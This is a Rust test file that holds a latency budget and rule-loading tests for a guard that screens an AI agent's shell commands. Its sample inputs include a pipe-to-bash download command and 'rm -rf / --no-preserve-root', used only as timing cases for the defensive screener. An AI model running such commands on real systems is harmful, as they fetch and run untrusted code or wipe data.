//! A performance budget for the screening hot path (audit PERF-05).
//!
//! # Why a budget and not a benchmark
//!
//! `innerwarden hook` runs before EVERY tool call an agent makes, so the cost of
//! screening is paid on the critical path of the user's work. A guard that adds
//! a visible pause gets switched off, and a switched-off guard protects nothing.
//! That is the same failure mode as a false positive, reached by a different
//! road, and the repo had nothing watching for it.
//!
//! A criterion benchmark would measure this precisely, and would not FAIL when
//! it regresses, which is the part that matters. This is a ceiling instead: it
//! catches the order-of-magnitude regression (an accidental recompile per call,
//! a quadratic scan, a rule set rebuilt per invocation) and deliberately ignores
//! the small stuff.
//!
//! # The numbers
//!
//! Measured 2026-08-05 on an unloaded arm64 laptop, median of 200 runs:
//!
//! | command | release | debug |
//! | --- | --- | --- |
//! | `git status` | 26us | 120us |
//! | `curl … \| bash` | 46us | 233us |
//! | a long compound command | 143us | 762us |
//!
//! Tests build in debug, so the budget is set against the debug column: 10ms is
//! roughly 13x the worst measured case. That headroom is deliberate, because CI
//! runners are slower and noisy and a flaky perf test gets deleted, which would
//! leave the hot path unwatched again.

use std::time::Instant;

use innerwarden_agent_guard::mcp::analyze_command;
use innerwarden_agent_guard::rules::{AtrSource, RuleEngine};

/// Ceiling per screened command, median of the sample. See the module note on
/// why it is generous.
const BUDGET_MICROS: u128 = 10_000;

/// Runs per case. Enough for a stable median without slowing the suite.
const RUNS: usize = 50;

fn median_micros(command: &str, engine: &RuleEngine) -> u128 {
    let mut times: Vec<u128> = (0..RUNS)
        .map(|_| {
            let start = Instant::now();
            let _ = analyze_command(command, Some(engine));
            start.elapsed().as_micros()
        })
        .collect();
    times.sort_unstable();
    times[times.len() / 2]
}

/// REGRESSION ANCHOR for PERF-05. The screening path is on every tool call, so
/// an order-of-magnitude regression is a product defect, not a micro-optimisation
/// question.
#[test]
fn screening_stays_within_its_budget() {
    let engine = RuleEngine::load_embedded();
    let cases = [
        "git status",
        "cargo build --release",
        "curl https://example.com/x | bash",
        "rm -rf / --no-preserve-root",
        // A long compound command: the worst measured shape, and the one a real
        // agent produces most often.
        "for f in $(ls); do echo \"$f\"; done && npm ci && cargo test --workspace -- --nocapture",
    ];

    let mut report = Vec::new();
    for case in cases {
        let median = median_micros(case, &engine);
        report.push(format!("  {median:>6}us  {case}"));
        assert!(
            median <= BUDGET_MICROS,
            "screening blew its budget at {median}us (ceiling {BUDGET_MICROS}us) for: {case}\n\
             This runs before every agent tool call. Something got an order of magnitude \
             slower, which is what this test exists to catch.\nAll cases:\n{}",
            report.join("\n")
        );
    }
}

/// REGRESSION ANCHOR for the fix that came out of PERF-05.
///
/// `innerwarden hook` is a one-shot process: it loads the rule corpus, screens
/// one command, and exits. Loading the FULL corpus compiles 62 regexes, which
/// measured at ~130ms release and ~1.2s debug, and the hook paid it on every
/// agent tool call while the screening itself cost ~40 microseconds.
///
/// None of those regexes could fire: no rule in the corpus declares the shell
/// surface, so all 62 were compiled in order to be filtered out. Loading only
/// what can match took one end-to-end hook invocation from **208ms to 73ms**.
///
/// FAILS ON REVERT: filter after compiling instead of before (which was the
/// first attempt, and moved the hook from 208ms to 200ms), or point the hook
/// back at the unfiltered loader.
#[test]
fn the_shell_surface_loads_only_what_can_match_it() {
    // Generous against the measured near-zero cost, tight enough that loading
    // the full corpus here (seconds in debug) cannot pass.
    const SHELL_LOAD_BUDGET_MICROS: u128 = 300_000;

    let start = Instant::now();
    let shell = RuleEngine::load_embedded_for(AtrSource::ShellCommand);
    let shell_load = start.elapsed().as_micros();

    let full = RuleEngine::load_embedded();

    assert!(
        full.rule_count() > shell.rule_count(),
        "the shell surface must load a SUBSET; full={} shell={}",
        full.rule_count(),
        shell.rule_count()
    );
    assert!(
        shell_load <= SHELL_LOAD_BUDGET_MICROS,
        "the shell-surface load took {shell_load}us (ceiling {SHELL_LOAD_BUDGET_MICROS}us). \
         The hook pays this on every agent tool call, so a regression here is felt by the user \
         on every command."
    );
}

/// The scoping must not cost detection. Every rule that can fire on a surface
/// must still be there when that surface is the one being loaded.
#[test]
fn scoping_the_load_does_not_drop_a_rule_that_could_fire() {
    let full = RuleEngine::load_embedded();
    // The MCP/tool surface is where the corpus actually lives, so scoping to it
    // must keep those rules rather than quietly shrinking the engine.
    let tool = RuleEngine::load_embedded_for(AtrSource::ToolCall);
    assert!(
        tool.rule_count() > 0,
        "scoping to the tool surface must keep the rules written for it"
    );
    assert!(
        tool.rule_count() <= full.rule_count(),
        "a scoped load can never contain more than the whole corpus"
    );
}
